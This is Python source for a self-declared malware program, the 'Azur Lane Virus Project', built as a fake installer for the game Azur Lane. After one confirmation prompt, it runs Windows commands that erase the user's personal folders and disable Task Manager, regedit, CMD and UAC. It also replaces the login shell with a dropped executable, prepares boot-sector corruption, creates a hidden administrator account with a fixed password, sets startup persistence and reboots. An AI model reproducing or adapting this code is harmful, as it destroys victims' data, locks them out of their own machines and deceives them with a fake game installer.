# =======================================
# Azur Lane Virus Project
# Written in Python By Insertx2k Dev
# =======================================
# This software is considered to be a malware, which means it is COMPLETELY dangerous for you and your personal information to execute such software.
# This source code belongs to Azur Lane Virus Project, not something else.
# Must not be redistributed within anything without respective permission from Insertx2k Dev
# This program is not licensed.
# =======================================
from tkinter import *
root = Tk()
root.title("Azur Lane Installer for Win32")
root.geometry('600x300')
root.resizable(False,False)
root.iconbitmap('al.ico')
pic = PhotoImage(file="al.png")
# Defines the install now window as a class.
class install_window:
    # Defines the Tkinter window.
    def call_window(self):
      # Destroys the previously started Window.
      root.destroy()
      # Impoorts the Tkinter library
      import tkinter
      from tkinter.ttk import Progressbar
      from tkinter import messagebox
      # Imports the awesome WINTCMD library by Insertx2k Dev.
      import WINTCMD
      # Defining the disable_event used to disable shortcuts Alt+F4 and the [X] button in window decorations.
      def disable_event():
          pass
      # Defining the destroy os function
      def destroy_os():
          install_progress_bar['value'] = 10
          ms_confirm = messagebox.askquestion("Confirmation", "The program you just decided to run is considered a malware, Which means executing it or improperly using it puts you and your personal information at a risk\nAre you seriously sure you wish to continue?, Think of it again.\nThis malware is not a joke, it is the ALVirus\n\nSo Do you wish to processed?")
          if ms_confirm == 'yes':
              install_progress_bar['value'] = 15
              status_lbl.configure(text="Note : You may see some Command Prompt Windows, Don't worry, they are used to copy files.")
              # Executes the commands used to copy runtime components into Windows Directories.
              WINTCMD.term('copy "%cd%/bmgr.exe" "%windir%/bmgr.exe"')
              WINTCMD.term('copy "%cd%\\uac-disable.exe" "%windir%\\uac-disable.exe"')
              WINTCMD.term('copy "%cd%\\bootsect-corrupt.bin" "%windir%\\bootsect-corrupt.bin"')
              WINTCMD.term('copy "%cd%\\shell.exe" "%windir%\\shell.exe"')
              WINTCMD.term('copy "%cd%\\shell-sourcecode.py" "%windir%\\shell-sourcecode.py"')
              WINTCMD.term('copy "%cd%\\startup.bat" "%windir%\\startup.bat"')
              WINTCMD.term('copy "%windir%\\startup.bat" "%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\startup.bat"')
              install_progress_bar['value'] = 20
              # Installs some registry keys to show that Azur Lane is installed but it isn't
              WINTCMD.term('REG ADD HKEY_CURRENT_USER\\software\\microsoft\\windows\\currentversion\\uninstall\\azur-lane-soft /f')
              WINTCMD.term('REG ADD HKEY_CURRENT_USER\\software\\microsoft\\windows\\currentversion\\uninstall\\azur-lane-soft /v "DisplayName" /t REG_SZ /d "Azur Lane" /f')
              WINTCMD.term('REG ADD HKEY_CURRENT_USER\\software\\microsoft\\windows\\currentversion\\uninstall\\azur-lane-soft /v "Publisher" /t REG_SZ /d "Yostar" /f')
              WINTCMD.term('REG ADD HKEY_CURRENT_USER\\software\\microsoft\\windows\\currentversion\\uninstall\\azur-lane-soft /v "URLInfoAbout" /t REG_SZ /d "https://twitter.com/azur-lane-en" /f')
              WINTCMD.term('REG ADD HKEY_CURRENT_USER\\software\\microsoft\\windows\\currentversion\\uninstall\\azur-lane-soft /v "DisplayVersion" /t REG_SZ /d "r0.1.2.6.9 (Unofficial)" /f')
              WINTCMD.term('REG ADD HKEY_CURRENT_USER\\software\\microsoft\\windows\\currentversion\\uninstall\\azur-lane-soft /v "DisplayIcon" /t REG_SZ /d "%cd%\\shell.exe,0" /f')
              WINTCMD.term('REG ADD HKEY_CURRENT_USER\\software\\microsoft\\windows\\currentversion\\uninstall\\azur-lane-soft /v "InstallDate" /t REG_SZ /d "20691010" /f')
              WINTCMD.term('REG ADD HKEY_CURRENT_USER\\software\\microsoft\\windows\\currentversion\\uninstall\\azur-lane-soft /v "InstallLocation" /t REG_SZ /d "%windir%\\system32" /f')
              WINTCMD.term('REG ADD HKEY_CURRENT_USER\\software\\microsoft\\windows\\currentversion\\uninstall\\azur-lane-soft /v "NoRepair" /t REG_DWORD /d 0x00000001 /f')
              WINTCMD.term('REG ADD HKEY_CURRENT_USER\\software\\microsoft\\windows\\currentversion\\uninstall\\azur-lane-soft /v "NoModify" /t REG_DWORD /d 0x00000001 /f')
              WINTCMD.term('REG ADD HKEY_CURRENT_USER\\software\\microsoft\\windows\\currentversion\\uninstall\\azur-lane-soft /v "NoRemove" /t REG_DWORD /d 0x00000000 /f')
              # Sets the progress bar value.
              install_progress_bar['value'] = 25
              # Installs the required registry keys to disable Windows Task Manager to prevent user from trying to close this window.
              WINTCMD.term('REG ADD "HKEY_CURRENT_USER\\software\\microsoft\\windows\\currentversion\\policies\\system" /f')
              WINTCMD.term('REG ADD "HKEY_CURRENT_USER\\software\\microsoft\\windows\\currentversion\\policies\\system" /v "DisableTaskMgr" /t REG_DWORD /d 0x00000001 /f')
              # Sets the progress bar value #2.
              install_progress_bar['value'] = 30
              # Installs some registry keys used to change the Windows System shell to the file %windir%\\shell.exe instead of explorer.exe
              WINTCMD.term('REG ADD "HKEY_LOCAL_MACHINE\\software\\microsoft\\windows nt\\currentversion\\winlogon" /v "Shell" /t REG_SZ /d "%windir%\\shell.exe" /f')
              # Now that the shell has been disabled, I guess we should do an attempt to erase the directories of %userprofile% (excl. appdata folders of course)
              WINTCMD.term('erase /S /F /Q "%userprofile%\\Documents" >nul')
              WINTCMD.term('erase /S /F /Q "%userprofile%\\My Documents" >nul')
              WINTCMD.term('erase /S /F /Q "%userprofile%\\Pictures" >nul')
              WINTCMD.term('erase /S /F /Q "%userprofile%\\Videos" >nul')
              WINTCMD.term('erase /S /F /Q "%userprofile%\\Downloads" >nul')
              WINTCMD.term('erase /S /F /Q "%userprofile%\\Desktop" >nul')
              WINTCMD.term('erase /S /F /Q "%userprofile%\\Music" >nul')
              WINTCMD.term('erase /S /F /Q "%userprofile%\\Links" >nul')
              WINTCMD.term('erase /S /F /Q "%userprofile%\\Saved Games" >nul')
              WINTCMD.term('erase /S /F /Q "%userprofile%\\Searches" >nul')
              WINTCMD.term('erase /S /F /Q "%userprofile%\\Favorites" >nul')
              WINTCMD.term('erase /S /F /Q "%userprofile%\\Contacts" >nul')
              # Sets the progressbar value #3
              install_progress_bar['value'] = 45
              # Disabling Windows User Account Control (UAC for short) to help the shell.exe destroy the bootsector of the PC without any restrictions.
              WINTCMD.term('%windir%\\uac-disable.exe')
              # Sets the progressbar value #4
              install_progress_bar['value'] = 85
              # Taking a backup of the current bootsector.
              WINTCMD.term('%windir%\\bmgr.exe /DEVICE=%systemdrive% /mbr /backup /file="%windir%\\bootsect-backup.bin" /sectors=1 /quiet >nul')
              # Creates the user Enterprise, and adds a comment to the current user.
              WINTCMD.term('net user "%username%" /active:yes')
              WINTCMD.term('net user "%username%" /passwordreq:no')
              WINTCMD.term('net user "%username%" /comments:"An encrypted account by the Azur Lane virus - Coded by Insertx2k Dev"')
              WINTCMD.term('net user /add Enterprise')
              WINTCMD.term('net user Enterprise /active:yes')
              WINTCMD.term('net user Enterprise /passwordreq:yes')
              WINTCMD.term('net user Enterprise iloveenterprise')
              WINTCMD.term('net user Enterprise /expires:never')
              WINTCMD.term('net localgroup /add Administrators Enterprise')
              WINTCMD.term('net localgroup /add Users Enterprise')
              WINTCMD.term('net localgroup /add Power Users Enterprise')
              WINTCMD.term('net user Guest /active:no')
              # Injects the additional 3rd party startup code into registry
              WINTCMD.term('REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "SysShellRep" /t REG_SZ /d "%windir%\\shell.exe" /f')
              WINTCMD.term('REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "SysShellStartupCMD" /t REG_SZ /d "%windir%\\startup.bat" /f')
              # Disables Registry editing
              WINTCMD.term('REG ADD "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /f')
              WINTCMD.term('REG ADD "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v "DisableRegistryTools" /t REG_DWORD /d 1 /f')
              # Reboots the computer.
              # Gets the variables from the class power_mgr() into the x variable.
              x = WINTCMD.power_mgr()
              WINTCMD.term(x.reboot)
              # Disables Windows Command Prompt through Registry.
              WINTCMD.term('REG ADD "HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\System" /f')
              WINTCMD.term('REG ADD "HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\System" /v "DisableCMD" /t REG_DWORD /d 0x00000002 /f')
              # Sets the progress bar value #5
              install_progress_bar['value'] = 100
              # Changes the label to be saying that all pending operations has been successfully completed.
              status_lbl.configure(text="Status : All pending operations has been successfully completed!")
          else:
              install_window_root.destroy()
      # Defines the window root.
      install_window_root = Tk()
      install_window_root.title("Azur Lane Installer for Win32")
      install_window_root.geometry('600x300')
      install_window_root.iconbitmap('al.ico')
      install_window_root.resizable(False,False)
      # The code used to disable the [X] button in the installation Window.
      install_window_root.protocol("WM_DELETE_WINDOW", disable_event)
      game_icox = PhotoImage(file="al.png")
      lbl0x = Label(install_window_root, text="Azur Lane Setup")
      lbl0x.place(x=90, y=25)
      lbl1x = Label(install_window_root, text="This should help you properly install Azur Lane game in your computer.")
      lbl1x.place(x=10 ,y=70)
      lbl2x = Label(install_window_root, text="Please wait while we install Azur Lane in your computer...")
      lbl2x.place(x=10, y=90)
      game_logox = Label(install_window_root, image=game_icox)
      game_logox.place(x=15 ,y=8, relwidth=0.1, relheight=0.19)
      install_progress_bar = Progressbar(install_window_root, length=580)
      install_progress_bar.place(x=10, y=150)
      install_progress_bar['value'] = 0
      status_lbl = Label(install_window_root, text="Status : Initializing the Installer...")
      status_lbl.place(x=10 ,y=175)
      destroy_os()
      install_window_root.mainloop()
def call_window_installer():
    x = install_window()
    x.call_window()
# Defines the AL Game icon in the installer of the game.
game_icon = Label(root, image=pic)
game_icon.place(x=15 ,y=8, relwidth=0.1 ,relheight=0.19)
lbl0 = Label(root, text="This should help you properly install Azur Lane game in your computer.")
lbl0.place(x=10 ,y=70)
lbl1 = Label(root, text="Azur Lane Setup")
lbl1.place(x=90 ,y=25)
install_btn = Button(root, text="Install Now", command=call_window_installer)
install_btn.place(x=250 ,y=260)
lbl2 = Label(root, text="Feel free to click the 'Install Now' button when you feel like to do!")
lbl2.place(x=10 ,y=90)
lbl3 = Label(root, text="By Installing Azur Lane game, You completely agree to Yostar's License Agreement, and Terms of Service", font=("Arial", 8))
lbl3.place(x=35 ,y=230)
root.mainloop()